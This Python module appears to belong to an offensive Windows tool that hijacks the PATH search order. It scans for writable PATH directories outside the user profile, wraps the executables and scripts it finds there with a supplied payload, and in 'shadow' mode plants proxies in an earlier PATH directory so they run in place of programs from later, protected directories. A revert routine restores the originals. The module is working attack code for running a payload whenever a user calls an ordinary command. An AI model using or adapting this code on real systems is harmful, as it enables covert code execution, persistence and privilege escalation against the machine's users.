from __future__ import annotations

from pathlib import Path

from .. import ui as console
from ..core.common import (
    PAYLOAD_FALLBACK,
    PAYLOAD_NAME,
    is_orig_sidecar,
    live_from_orig,
    orig_sidecar,
)
from ..core.compiler import Compiler
from .kinds import KINDS
from .script import remove_ps1_cmd_sidecar
from ..core.pathscan import auto_targets, is_windows_dir, scan_path_dirs, shadow_plan


def _iter_files(folder: Path) -> list[Path]:
    try:
        items = list(folder.iterdir())
    except OSError:
        return []
    out: list[Path] = []
    for path in items:
        try:
            if path.is_file():
                out.append(path)
        except OSError:
            continue
    return out


def _files(folder: Path, ext: str) -> list[Path]:
    return [p for p in _iter_files(folder) if p.suffix.lower() == ext]


def _origs(folder: Path, ext: str) -> list[Path]:
    return [
        p
        for p in _iter_files(folder)
        if p.suffix.lower() == ext and is_orig_sidecar(p)
    ]


def _has_any_orig(folder: Path) -> bool:
    return any(_origs(folder, kind.ext) for kind in KINDS)


def _revert_file(orig: Path) -> str | None:
    live = live_from_orig(orig)
    try:
        if live.exists():
            live.unlink()
        orig.rename(live)
    except OSError as exc:
        return str(exc)
    if live.suffix.lower() == ".ps1":
        remove_ps1_cmd_sidecar(live)
    return None


def _maybe_remove_payload(folder: Path) -> str | None:
    if _has_any_orig(folder):
        return None
    payload = folder / PAYLOAD_NAME
    if not payload.exists():
        return None
    try:
        payload.unlink()
        console.info(f"{PAYLOAD_NAME}  removed")
    except OSError as exc:
        return str(exc)
    return None


def _remove_fallback_payload() -> str | None:
    if not PAYLOAD_FALLBACK.exists():
        return None
    try:
        PAYLOAD_FALLBACK.unlink()
        console.info(f"{PAYLOAD_FALLBACK}  removed")
    except OSError as exc:
        return str(exc)
    return None


def _revert_origs(origs: list[Path]) -> tuple[int, int]:
    rc = 0
    restored = 0
    for orig in origs:
        live = live_from_orig(orig)
        err = _revert_file(orig)
        if err:
            rc = 2
            console.fail(f"{orig.name} -> {live.name}  {err}")
        else:
            restored += 1
            console.ok(f"{live.name}  restored")
    return rc, restored


def _revert_dirs(dirs: list[Path], kinds=KINDS) -> int:
    if not dirs:
        console.warn("nothing to revert")
        return 0

    rc = 0
    restored = 0
    for folder in dirs:
        console.section(str(folder))
        origs: list[Path] = []
        for kind in kinds:
            origs.extend(_origs(folder, kind.ext))
        if not origs:
            console.info("nothing to revert")
            continue
        d_rc, d_ok = _revert_origs(origs)
        rc = rc or d_rc
        restored += d_ok
        err = _maybe_remove_payload(folder)
        if err:
            rc = 2
            console.fail(f"{PAYLOAD_NAME}  {err}")
    console.section("summary")
    console.ok(f"restored {restored}")
    return rc


def _proxy_into(
    src: Path,
    dest: Path,
    payload: str,
    skip: str | None,
    compilers: list[Compiler] | None,
    kinds,
) -> int:
    rc = 0
    work = False
    for kind in kinds:
        files = [path for path in _files(src, kind.ext) if not is_orig_sidecar(path)]
        if not files:
            continue
        work = True
        console.info(f"{len(files)} {kind.ext[1:]}")
        for path in files:
            console.debug(str(path))
        result = kind.proxy(
            input=src,
            output=dest,
            payload=payload,
            skip=skip,
            keep_going=True,
            compilers=compilers,
        )
        if result != 0:
            rc = result
    if not work:
        console.info("empty  skip")
    return rc


def _run_auto_shadow(
    payload: str,
    skip: str | None,
    compilers: list[Compiler] | None,
    kinds,
    aggressive: bool,
) -> int:
    plan = shadow_plan(aggressive=aggressive)
    if plan is None:
        console.warn("no ranked writable PATH dir outside the user profile")
        return 0
    dest, sources = plan
    console.section(str(dest.path))
    console.info(f"#{dest.rank}  shadow dest")
    if console.is_verbose():
        for item in scan_path_dirs():
            if item.rank is None or dest.rank is None or item.rank <= dest.rank:
                continue
            if not item.exists:
                why = "missing"
            elif item.writable:
                why = "writable"
            elif not aggressive and is_windows_dir(item.path):
                why = "windows"
            else:
                continue
            console.debug(f"#{item.rank}  skip  {why}  {item.path}")
    if not sources:
        console.warn("no later unwritable PATH dirs")
        return 0
    rc = 0
    for item in sources:
        console.section(f"#{item.rank}  {item.path}")
        rc = rc or _proxy_into(item.path, dest.path, payload, skip, compilers, kinds)
    return rc


def run_auto(
    payload: str,
    skip: str | None = None,
    compilers: list[Compiler] | None = None,
    kinds=KINDS,
    shadow: bool = False,
    aggressive: bool = False,
) -> int:
    if shadow:
        return _run_auto_shadow(payload, skip, compilers, kinds, aggressive)

    targets = auto_targets(aggressive=aggressive)
    if not targets:
        console.warn("no writable PATH dirs outside the user profile")
        return 0

    rc = 0
    for item in targets:
        folder = item.path
        console.section(str(folder))
        work = False
        for kind in kinds:
            if not _files(folder, kind.ext):
                continue
            work = True
            result = kind.proxy(
                input=folder,
                output=folder,
                payload=payload,
                skip=skip,
                keep_going=True,
                compilers=compilers,
            )
            if result != 0:
                rc = result
        if not work:
            console.info("empty  skip")
    return rc


def _orig_for_file(path: Path) -> Path | None:
    if is_orig_sidecar(path):
        return path if path.is_file() else None
    sidecar = orig_sidecar(path)
    if sidecar.is_file():
        return sidecar
    return None


def run_revert(target: str | Path | None = None, kinds=KINDS, aggressive: bool = False) -> int:
    if target is None:
        dirs = [item.path for item in auto_targets(aggressive=aggressive)]
        rc = 0
        if not dirs:
            console.warn("no writable PATH dirs outside the user profile")
        else:
            rc = _revert_dirs(dirs, kinds)
        err = _remove_fallback_payload()
        if err:
            console.fail(f"{PAYLOAD_NAME}  {err}")
            rc = 2
        return rc

    path = Path(target)
    if path.is_file():
        orig = _orig_for_file(path)
        if orig is None:
            console.fail(f"no .original sidecar  {path}")
            return 1
        console.section(str(path.parent))
        rc, restored = _revert_origs([orig])
        err = _maybe_remove_payload(path.parent)
        if err:
            rc = 2
            console.fail(f"{PAYLOAD_NAME}  {err}")
        console.section("summary")
        console.ok(f"restored {restored}")
        return rc
    if path.is_dir():
        return _revert_dirs([path], kinds)
    console.fail(f"input does not exist  {path}")
    return 1
